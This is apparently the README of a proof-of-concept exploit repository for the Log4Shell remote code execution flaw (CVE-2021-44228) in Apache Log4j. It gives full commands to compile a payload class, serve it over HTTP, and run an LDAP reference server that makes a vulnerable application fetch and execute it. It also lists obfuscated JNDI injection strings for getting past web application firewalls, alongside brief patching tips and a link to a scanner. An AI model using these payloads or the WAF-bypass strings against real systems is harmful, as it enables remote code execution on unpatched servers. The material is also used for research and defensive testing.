# CVE-2021-44228(Apache Log4j Remote Code Execution）

> [all log4j-core versions >=2.0-beta9 and <=2.14.1](https://logging.apache.org/log4j/2.x/security.html)

The version of 1.x have other vulnerabilities, we recommend that you update the latest version.

[Security Advisories / Bulletins linked to Log4Shell (CVE-2021-44228)](https://gist.github.com/SwitHak/b66db3a06c2955a9cb71a8718970c592)

### Usage:

download this project, compile the exploit code [blob/master/src/main/java/Exploit.java](Exploit.java), and start a webserver allowing downloading the compiled binary.

```
git clone https://github.com/tangxiaofeng7/CVE-2021-44228-Apache-Log4j-Rce.git
cd CVE-2021-44228-Apache-Log4j-Rce

javac Exploit.java

# start webserver
# For Python2
python -m SimpleHTTPServer 8888
# For Python3
python3 -m http.server 8888

# make sure python webserver is running the same directory as Exploit.class, to test
  curl -I 127.0.0.1:8888/Exploit.class
```

download another project and run *LDAP server implementation returning JNDI references*
[https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java](https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java)
```
git clone https://github.com/mbechler/marshalsec.git
cd marshalsec
# Java 8 required
mvn clean package -DskipTests
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://127.0.0.1:8888/#Exploit"
```

build and run the activation code (simulate an log4j attack on a vulnerable java web server) [blob/master/src/main/java/log4j.java](log4j.java), and your calculator app will appear.
```
cd CVE-2021-44228-Apache-Log4j-Rce
mvn clean package
java -cp target/log4j-rce-1.0-SNAPSHOT-all.jar log4j

# expect the following
# 1. calculator app appear
# 2. in ldapserver console,
#  Send LDAP reference result for Exploit redirecting to http://127.0.0.1:8888/Exploit.class
# 3. in webserver console,
#  127.0.0.1 - - [....] "GET /Exploit.class HTTP/1.1" 200 -


```



Tips:
> Do not rely on a current Java version to save you. Update Log4 (or remove the JNDI lookup). Disable the expansion (seems a pretty bad idea anyways).

### Bypass rc1
For example:
```
${jndi:ldap://127.0.0.1:1389/ badClassName}
```

### Bypass WAF
```
${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://asdasd.asdasd.asdasd/poc}
${${::-j}ndi:rmi://asdasd.asdasd.asdasd/ass}
${jndi:rmi://adsasd.asdasd.asdasd}
${${lower:jndi}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:${lower:jndi}}:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${lower:n}${lower:d}i:${lower:rmi}://adsasd.asdasd.asdasd/poc}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
```
> Don't trust the web application firewall.

### Details Of Vuln
Lookups provide a way to add values to the Log4j configuration at arbitrary places.

[Lookups](https://logging.apache.org/log4j/2.x/manual/lookups.html)

> The methods to cause leak in finally

```
LogManager.getLogger().error()
LogManager.getLogger().fatal()
```

### Simple Check Method
If you want to do black-box testing， I suggest you do passive scanning.

[BurpLog4jScan](https://github.com/tangxiaofeng7/BurpLog4j2Scan)

Have Fun!!!
![BurpLog4jScan.png](https://github.com/tangxiaofeng7/BurpLog4j2Scan/blob/master/img/result.png)

### Stargazers over time
[![Stargazers over time](https://starchart.cc/tangxiaofeng7/apache-log4j-poc.svg)](https://starchart.cc/tangxiaofeng7/apache-log4j-poc)
